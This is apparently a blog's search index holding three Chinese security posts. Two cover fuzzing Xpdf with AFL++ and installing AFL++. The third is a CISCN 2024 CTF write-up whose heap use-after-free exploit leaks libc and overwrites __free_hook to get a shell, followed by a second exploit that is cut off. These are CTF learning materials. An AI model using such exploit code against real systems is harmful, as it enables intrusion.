<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fuzzing101-01</title>
    <link href="/2024/07/01/fuzzing101-01/"/>
    <url>/2024/07/01/fuzzing101-01/</url>
    
    <content type="html"><![CDATA[<h1 id="Xpdf"><a href="#Xpdf" class="headerlink" title="Xpdf"></a><center>Xpdf</h1><p>CVE-2019-13288</p><h2 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h2><p>环境安装(如make和gcc)</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> build-essential<br></code></pre></td></tr></table></figure><p>下载Xpdf 3.02</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.xpdfreader.com/old/xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xvzf xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br></code></pre></td></tr></table></figure><p>构建Xpdf</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> xpdf-3.02<br>sudo apt update &amp;&amp; sudo apt install -y build-essential gcc<br><br><span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=</span><span class="hljs-string">&quot;你需要存放的路径/install/&quot;</span><br><span class="hljs-comment">#./configure: 这是一个脚本，用于检查系统的环境并生成适当的 Makefile。</span><br><span class="hljs-comment">#--prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;: 这是一个配置选项，指定软件安装的前缀路径。所有的安装文件（例如可执行文件、库文件等）都会被安装到这个路径下。</span><br><br>make<br><span class="hljs-comment">#会读取当前目录下的Makefile文件并执行其中的指令</span><br>make install<br><span class="hljs-comment">#将编译好的程序、库文件和其他资源文件安装道系统的指定目录中</span><br></code></pre></td></tr></table></figure><p>下载pdf示例用于测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mozilla/</span>pdf.js-sample-files<span class="hljs-regexp">/raw/m</span>aster/helloworld.pdf<br><br>上一步存放的路径<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/pdfinfo -box -meta pfd示例存放的路径/</span>pdf_examples/helloworld.pdf<br></code></pre></td></tr></table></figure><p>​出现下面所示说明xpdf搭建成功</p><img src="/2024/07/01/fuzzing101-01/1.png" class=""><h2 id="AFL-编译项目开始fuzz"><a href="#AFL-编译项目开始fuzz" class="headerlink" title="AFL++编译项目开始fuzz"></a>AFL++编译项目开始fuzz</h2><p>首先将之间编译的内容删除并清空</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r 你的路径/install (就是之间指定存放install的地方)<br><span class="hljs-built_in">cd</span> 你的路径/xpdf-3.02<br>make clean<br></code></pre></td></tr></table></figure><p>用afl-clang-fast编译插桩</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd 你的路径/xpdf-3.02<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><br><span class="hljs-attribute">CC</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast <span class="hljs-attribute">CXX</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-comment">#其中的CC和CXX意思是指定c和c++的编译器分别为afl-clang-fast和afl-clang-fast++</span><br><br>make<br>make install<br></code></pre></td></tr></table></figure><p>编译完成后使用afl-fuzz开始编译</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">afl<span class="hljs-operator">-</span>fuzz <span class="hljs-operator">-</span>i 你的路径<span class="hljs-regexp">/pdf_examples/</span> <span class="hljs-operator">-</span>o 你指定的输出<span class="hljs-regexp">/out/</span> <span class="hljs-operator">-</span>s <span class="hljs-number">123</span> <span class="hljs-operator">--</span> 你的路径<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/pdftotext @@ 你的路径/</span>output<br><br><span class="hljs-operator">-</span>i 表示我们必须放置输入用例的目录（又称文件示例）<br><span class="hljs-operator">-</span>o 表示 <span class="hljs-type">AFL</span><span class="hljs-operator">++</span> 存储突变文件的目录<br><span class="hljs-operator">-</span>s 表示要使用的静态随机种子<br>@<span class="hljs-meta">@是占位符目标的命令行，AFL</span> 将用每个输入文件名替换该命令行<br><br></code></pre></td></tr></table></figure><img src="/2024/07/01/fuzzing101-01/2.png" class=""><p>​当看到saved crashes :有记录时就可以ctrl+c退出查看crash了，之后便是调试查看是什么问题了(由于我是已经跑完了再写的blog，所以忘记截图了，这里用下fuzzing101中的截图)</p><h2 id="调试查看结果"><a href="#调试查看结果" class="headerlink" title="调试查看结果"></a>调试查看结果</h2><p>重新编译程序</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">你的路径/xpdf-<span class="hljs-number">3.02</span>/<br>make clean<br><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span><br>make<br></code></pre></td></tr></table></figure><p>开始调试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> --args install/bin/pdftotext out/default/crashes/id:<span class="hljs-number">000000</span>,sig:<span class="hljs-number">11</span>,src:<span class="hljs-number">000703</span>,time:<span class="hljs-number">4193216</span>,execs:<span class="hljs-number">1820460</span>,op:havoc,rep:<span class="hljs-number">5</span> output<br></code></pre></td></tr></table></figure><img src="/2024/07/01/fuzzing101-01/3.png" class=""><p>发现原因是因为一直在循环</p><h2 id="强化训练"><a href="#强化训练" class="headerlink" title="强化训练"></a>强化训练</h2><p>来看看高版本的xpdf是否能成功fuzz</p><p>前面通用的操作，只不过这里不同的地方是4.04版本的xpdf不是configure来编译配置了，取而代之的则是cmake</p><img src="/2024/07/01/fuzzing101-01/4.png" class=""><img src="/2024/07/01/fuzzing101-01/5.png" class=""><p>配置指令为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cmake <span class="hljs-attribute">-DCMAKE_BUILD_TYPE</span>=Release <span class="hljs-attribute">-DCMAKE_C_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_CXX_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/<br></code></pre></td></tr></table></figure><p>当然，想要用afl进行插桩编译时配置命令则要加上afl的c和c++的编译器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><br>cmake <span class="hljs-attribute">-DCMAKE_BUILD_TYPE</span>=Debug /home/pw/fuzzing_xpdf/xpdf-4.04 <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/ <span class="hljs-attribute">-DCMAKE_C_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_CXX_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_CXX_COMPILER</span>=/home/fuzz_tools/AFLplusplus/afl-clang-fast++ -DCMAKE_CC_COMPIL<br><span class="hljs-attribute">ER</span>=/home/fuzz_tools/AFLplusplus/afl-clang-fast<br><span class="hljs-comment">#记得看下自己的路径</span><br><br><span class="hljs-attribute">AFL_USE_ASAN</span>=1 make<br>sudo <span class="hljs-attribute">AFL_USE_ASAN</span>=1 make install<br><span class="hljs-comment">#AFL_USE_ASAN=1 是一个环境变量设置，用于在编译过程中启用 AddressSanitizer (ASAN) 与 American Fuzzy Lop (AFL) 结合使用。其主要作用是检测内存错误，如缓冲区溢出、未初始化内存使用、内存泄漏等。</span><br><br></code></pre></td></tr></table></figure><p>启动fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/pdf_examples/ -o <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/out/ -s 123 -- <span class="hljs-variable">$HOME</span>/xpdf_4.04/xpdf/pdftotext @@ <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><img src="/2024/07/01/fuzzing101-01/6.png" class=""><p>刷了会视频就跑出一个crash，赶紧调试看看，调试发现可能因为错误的输入，导致realloc没有分配到地址，最后进入报错函数，总结没用，但还是学废了一点点东西</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AFL++安装</title>
    <link href="/2024/07/01/AFL++%E5%AE%89%E8%A3%85/"/>
    <url>/2024/07/01/AFL++%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-安装"><a href="#AFL-安装" class="headerlink" title="AFL++安装"></a><center>AFL++安装</h1><p>安装依赖项</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> update<br>sudo apt-<span class="hljs-built_in">get</span> install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools<br>sudo apt-<span class="hljs-built_in">get</span> install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-<span class="hljs-built_in">get</span> install -y lld llvm llvm-dev clang <br>sudo apt-<span class="hljs-built_in">get</span> install -y gcc-$(gcc --version|head -n1|sed <span class="hljs-string">&#x27;s/.* //&#x27;</span>|sed <span class="hljs-string">&#x27;s/\..*//&#x27;</span>)-plugin-dev libstdc++-$(gcc --version|head -n1|sed <span class="hljs-string">&#x27;s/.* //&#x27;</span>|sed <span class="hljs-string">&#x27;s/\..*//&#x27;</span>)-dev<br></code></pre></td></tr></table></figure><p>编译安装AFL++(编译项目时间很长请耐心等待)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-comment">#在当前终端中指定LLVM_CONFIG环境</span><br>sudo make distrib<br><span class="hljs-comment">#编译项目</span><br>sudo make install<br><span class="hljs-comment">#安装项目</span><br></code></pre></td></tr></table></figure><p>安装后输入afl-fuzz，出现以下内容即安装成功</p><img src="/2024/07/01/AFL++%E5%AE%89%E8%A3%85/1.png" class="">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024华中CISCN</title>
    <link href="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/"/>
    <url>/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/</url>
    
    <content type="html"><![CDATA[<h1 id="2024华中-ciscn"><a href="#2024华中-ciscn" class="headerlink" title="2024华中-ciscn"></a><center>2024华中-ciscn</h1><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>菜单堆题，漏洞点uaf，2.31的堆，泄露libc打free_hook</p><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/1.png" class=""><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>    <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so&#x27;</span>)    <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">36592</span>)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,text</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,text</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment"># dbg()</span><br>free(<span class="hljs-number">0</span>)<br><br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>libc_base = u64(pw.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1ecbe0</span><br>lss(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>free(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># dbg()</span><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h2><p>go语言经典栈溢出，由于是静态文件，没有直接的rdi和rsi的pop，但是rax可控且有syscall，直接打srop</p><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/2.png" class=""><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/3.png" class=""><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span 